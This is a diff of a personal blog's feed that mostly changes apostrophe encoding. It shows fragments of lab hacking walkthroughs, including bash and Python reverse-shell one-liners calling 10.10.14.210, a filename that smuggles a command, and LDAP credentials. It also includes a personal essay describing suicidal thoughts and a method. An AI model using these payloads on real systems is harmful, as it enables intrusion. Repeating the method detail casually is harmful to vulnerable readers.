@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.2.1">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" hreflang="en" /><updated>2021-11-22T16:10:53+01:00</updated><id>/feed.xml</id><title type="html">Ybenel</title><subtitle>Where Knowledge is peace of cake.</subtitle><author><name>Ybenel</name></author><entry><title type="html">THM - CyberCrafted</title><link href="/thm/2021/11/22/THM-CyberCrafted.html" rel="alternate" type="text/html" title="THM - CyberCrafted" /><published>2021-11-22T00:00:00+01:00</published><updated>2021-11-22T00:00:00+01:00</updated><id>/thm/2021/11/22/THM-CyberCrafted</id><content type="html" xml:base="/thm/2021/11/22/THM-CyberCrafted.html">&lt;p&gt;A Medium Linux Machine That Consist Of Exploiting A Minecraft Server.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="3.9.1">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" hreflang="en" /><updated>2021-12-28T16:17:50+01:00</updated><id>/feed.xml</id><title type="html">Ybenel</title><subtitle>Where Knowledge is peace of cake.</subtitle><author><name>Ybenel</name></author><entry><title type="html">THM - CyberCrafted</title><link href="/thm/2021/11/22/THM-CyberCrafted.html" rel="alternate" type="text/html" title="THM - CyberCrafted" /><published>2021-11-22T00:00:00+01:00</published><updated>2021-11-22T00:00:00+01:00</updated><id>/thm/2021/11/22/THM-CyberCrafted</id><content type="html" xml:base="/thm/2021/11/22/THM-CyberCrafted.html">&lt;p&gt;A Medium Linux Machine That Consist Of Exploiting A Minecraft Server.&lt;/p&gt;
 
 &lt;h2 id=&quot;user-enumeration&quot;&gt;User Enumeration&lt;/h2&gt;
 
@@ -311,7 +311,7 @@ LFI -&amp;gt; (Cache VSFTPD) -&amp;gt; RCE
           &lt;/li&gt;
           &lt;li&gt;Inside Of rev
             &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
-    /bin/bash &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.210/9110 0&amp;gt;&amp;amp;1&apos;&lt;/span&gt;
+    /bin/bash &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.210/9110 0&amp;gt;&amp;amp;1'&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;            &lt;/div&gt;
           &lt;/li&gt;
           &lt;li&gt;Curl The Path
@@ -358,7 +358,7 @@ LFI -&amp;gt; (Cache VSFTPD) -&amp;gt; RCE
   &lt;li&gt;
     &lt;p&gt;Grabing User Password Through Ldap&lt;/p&gt;
 
-    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ldapsearch -x -h 127.0.0.1 -D &apos;cn=binduser,ou=users,dc=pikaboo,dc=htb&apos; -w J~42%W?PFHl]g -b &apos;dc=ftp,dc=pikaboo,dc=htb&apos;
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ldapsearch -x -h 127.0.0.1 -D 'cn=binduser,ou=users,dc=pikaboo,dc=htb' -w J~42%W?PFHl]g -b 'dc=ftp,dc=pikaboo,dc=htb'
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
 
     &lt;ul&gt;
@@ -380,7 +380,7 @@ homeDirectory: /home/pwnmeow
 userPassword:: X0cwdFQ0X0M0dGNIXyczbV80bEwhXw==
     
 echo -n X0cwdFQ0X0M0dGNIXyczbV80bEwhXw== | base64 -d
-_G0tT4_C4tcH_&apos;3m_4lL!_
+_G0tT4_C4tcH_'3m_4lL!_
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
       &lt;/li&gt;
     &lt;/ul&gt;
@@ -416,10 +416,10 @@ Bash commands were not suitable for this coz of being executed before even attem
 Other thing was to create a temporary file that has our payload which we can then execute by calling its full path, tho the issue is that we cannot create filename’s as a path , which left us we fewer options.
 Since Python was available, we can use a oneliner reverse shell as our payload , tho it had to be really perfect specially with escaping double quotes.
 I Used the following oneliner reverse shell&lt;/p&gt;
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;n&quot;&gt;python&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.210&quot;,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(&quot;sh&quot;);&apos;&lt;/span&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;n&quot;&gt;python&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.210&quot;,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(&quot;sh&quot;);'&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;After Editing it to escape double quotes and create an empty file&lt;/p&gt;
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;n&quot;&gt;touch&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;|python3 -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&lt;/span&gt;\&lt;span class=&quot;s&quot;&gt;&quot;10.10.14.210&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1337&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fileno&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fileno&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fileno&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;;.csv&quot;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;n&quot;&gt;touch&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;|python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&lt;/span&gt;\&lt;span class=&quot;s&quot;&gt;&quot;10.10.14.210&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1337&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fileno&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fileno&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fileno&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;';.csv&quot;
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;Then we go back to ftp and upload it, &lt;strong&gt;ONE BIG FAT WARNING&lt;/strong&gt; If you tried to upload the file to the root folder, it will not work and file will not be uploaded, and you’ll get really frustrated on why not it didn’t work like myself lol.
 Choose any folder , it doesn’t matter which one and upload it to it .
@@ -428,53 +428,53 @@ Choose any folder , it doesn’t matter which one and upload it to it .
 You’ll receive a
 &lt;img src=&quot;https://ybenel.cf/imgs/pikaboo/root_flag.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;</content><author><name>[&quot;ybenel&quot;]</name></author><category term="HTB" /><category term="HTB" /><category term="Hard" /><category term="Logs" /><category term="LFI" /><category term="Poisoning" /><category term="Misconfigurations" /><summary type="html">A Hard Machine That Consist On Exploiting MisConfigurations</summary></entry><entry><title type="html">The Pre Sequal</title><link href="/presequal/2021/09/07/Pre-Sequal.html" rel="alternate" type="text/html" title="The Pre Sequal" /><published>2021-09-07T00:00:00+01:00</published><updated>2021-09-07T00:00:00+01:00</updated><id>/presequal/2021/09/07/Pre-Sequal</id><content type="html" xml:base="/presequal/2021/09/07/Pre-Sequal.html">&lt;h3 id=&quot;suicide-spaceship&quot;&gt;Suicide Spaceship.&lt;/h3&gt;
 
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;To be honest i don&apos;t even know from where to start .
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;To be honest i don't even know from where to start .
 This is a sequel with no story but with aligned splash of eternal pain
-I&apos;ve been looking to fulfill my destiny which turned into a dark way
+I've been looking to fulfill my destiny which turned into a dark way
 The Amount of pain that is caused is beyond what i can handle
    
-when hearing about mental disorders, I&apos;d laugh about it
+when hearing about mental disorders, I'd laugh about it
 but never realized i might get it or had it myself
 It eats you slowly from deep inside just like cancer
-yet it is worst than cancer, cause there&apos;s a slightly chance slim to none
+yet it is worst than cancer, cause there's a slightly chance slim to none
 
-you&apos;ll get back recovered as some disorders are lifetime :(
+you'll get back recovered as some disorders are lifetime :(
 it begins when you start by your willingness disconnecting from the world around you
 Creating an isolating environment for yourself only .
 As my younger self , i had plenty of close friends which i used to hang out with all the time
 And i mean like a lot, we are still friends but not like we used to be
-it has been so long since I&apos;ve hanged out or meet any of them we barely even talk
+it has been so long since I've hanged out or meet any of them we barely even talk
 
 Well i barely i guess, and it is not just friends, even Ur own family
-I&apos;ve tried so hard to avoid my own family , i don&apos;t talk that much only when i have to
+I've tried so hard to avoid my own family , i don't talk that much only when i have to
 I avoid occasions special events , family meet ups . as it is a natural necessary action
 by reaching this state, Ur mind and body just flows inside of an infinite maze with no way out
-yourself becomes another entity , and you wouldn&apos;t believe what can u do.
-Your conscience will start acting on its own and you&apos;ll have no control over it,
+yourself becomes another entity , and you wouldn't believe what can u do.
+Your conscience will start acting on its own and you'll have no control over it,
 when feeling danger of exposing your sense, it lies to cover up its state and gets violent when being pushed.
-You start living a lie believing in something that never happened and ensuring yourself that you&apos;re good and doing the right thing.
+You start living a lie believing in something that never happened and ensuring yourself that you're good and doing the right thing.
 
-After yourself is locked away you&apos;ll be anti-social and facing post traumatic disorder, stress and anxiety start kicking .
-your chest will start getting heavier feeling burnout from inside and that&apos;s where pain takes its place , it feels like putting a ton of weight on Ur chest and cannot stand up
-you&apos;ll start thinking about cutting Ur chest open and left out the weight , and yes that is suicidal thoughts
-I&apos;ve had so many suicidal thoughts and how to achieve them , one of the easier ways is just by jumping off a building .
+After yourself is locked away you'll be anti-social and facing post traumatic disorder, stress and anxiety start kicking .
+your chest will start getting heavier feeling burnout from inside and that's where pain takes its place , it feels like putting a ton of weight on Ur chest and cannot stand up
+you'll start thinking about cutting Ur chest open and left out the weight , and yes that is suicidal thoughts
+I've had so many suicidal thoughts and how to achieve them , one of the easier ways is just by jumping off a building .
 Feeling the hair blows on Ur face while enjoying Ur last moment in peace before dying.
 Crying is another thing, you cry randomly with no reason which is another mental condition caused by stress, deep depressing and more awful things.
-Feeling guilt for your own self , it shows how deeply you&apos;re affected . one thing good about crying is that u feel less bad and stressed but not that much
+Feeling guilt for your own self , it shows how deeply you're affected . one thing good about crying is that u feel less bad and stressed but not that much
 i cry at anytime and absolutely i do hide it , nobody sees and no one should or find out .
 
 When being out for extreme condition, communicating is really hard after being anti-social and never talking with anybody took out some skills.
-fun fact, even simple words don&apos;t wanna come out of your mouth, being speechless and your voice also changes it becomes less heard .
-when being in isolation, you think you aren&apos;t hurting or disrupting while in most cases u doing more damage than u could .
-i don&apos;t blame people who hated me either for lying or some way indirectly , i can&apos;t say i can control the way things goes I&apos;m tied up.
+fun fact, even simple words don't wanna come out of your mouth, being speechless and your voice also changes it becomes less heard .
+when being in isolation, you think you aren't hurting or disrupting while in most cases u doing more damage than u could .
+i don't blame people who hated me either for lying or some way indirectly , i can't say i can control the way things goes I'm tied up.
 Drifting away in an infinite loop for no purpose.
-As Mental illness is no joke, i feel drowning in my left lifespan hoping someone catches my hand and pull me out of the misery I&apos;m in , there&apos;s only 2 ways either i kill it or it kills me 
-Tip: Do not hesitate getting treatment ASAP , don&apos;t be like me I&apos;ve ignored it too much and its now killing me slow :)
+As Mental illness is no joke, i feel drowning in my left lifespan hoping someone catches my hand and pull me out of the misery I'm in , there's only 2 ways either i kill it or it kills me 
+Tip: Do not hesitate getting treatment ASAP , don't be like me I've ignored it too much and its now killing me slow :)
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>[&quot;ybenel&quot;]</name></author><category term="PreSequal" /><category term="PreSequal" /><category term="Beginning" /><category term="Psychology" /><category term="Disorder" /><category term="Illness" /><summary type="html">Suicide Spaceship.</summary></entry><entry><title type="html">The End</title><link href="/theend/2021/08/27/Suicide.html" rel="alternate" type="text/html" title="The End" /><published>2021-08-27T00:00:00+01:00</published><updated>2021-08-27T00:00:00+01:00</updated><id>/theend/2021/08/27/Suicide</id><content type="html" xml:base="/theend/2021/08/27/Suicide.html">&lt;h3 id=&quot;lyrics-dedicated-to-those-whove-done-enough&quot;&gt;Lyrics Dedicated To Those Who’ve Done Enough.&lt;/h3&gt;
 
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;I&apos;ve always kept wondering what&apos;s with me .
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;I've always kept wondering what's with me .
 I have been through the nether
-I don&apos;t know how i survived
+I don't know how i survived
 Messing my life, changing like the tides
    
 I thought i could look past all these mistakes
@@ -489,12 +489,12 @@ And it play with my emotions
 Had me so high I was floating
 
 Looking beyond the truth
-thinking i&apos;m getting used
+thinking i'm getting used
 Blink back to my youth, i need a new groove
-Lying, cause I know she&apos;ll disapprove
-How I&apos;m flying so high, it&apos;s just me and you
-Can&apos;t tell by the red eyes, it was something new
-Nowadays it&apos;s the only thing we ever wanna do
+Lying, cause I know she'll disapprove
+How I'm flying so high, it's just me and you
+Can't tell by the red eyes, it was something new
+Nowadays it's the only thing we ever wanna do
 Our demise so true when the lies be coming true.
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>[&quot;ybenel&quot;]</name></author><category term="TheEnd" /><category term="TheEnd" /><summary type="html">Lyrics Dedicated To Those Who’ve Done Enough.</summary></entry><entry><title type="html">THM - CMSpit</title><link href="/thm/2021/08/05/THM-CMSpit.html" rel="alternate" type="text/html" title="THM - CMSpit" /><published>2021-08-05T00:00:00+01:00</published><updated>2021-08-05T00:00:00+01:00</updated><id>/thm/2021/08/05/THM-CMSpit</id><content type="html" xml:base="/thm/2021/08/05/THM-CMSpit.html">&lt;p&gt;CMSpit Is a medium linux machine that consist of identifying vulnerabilties related to web CMS framework that includes information gathering,user enumeration,privilege escalation.&lt;/p&gt;
 
@@ -513,7 +513,7 @@ Our demise so true when the lies be coming true.
 &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ssh&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hostkey&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
 &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;   &lt;span class=&quot;mi&quot;&gt;2048&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f9&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;23&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;29&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a9&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d9&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;82&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f5&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;49&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e4&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RSA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;   &lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;29&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ed&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;55&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;43&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;19&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e7&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;73&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a7&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;09&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;79&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;49&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ECDSA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;43&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ad&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;86&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;07&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;94&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f9&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;01&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ED25519&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
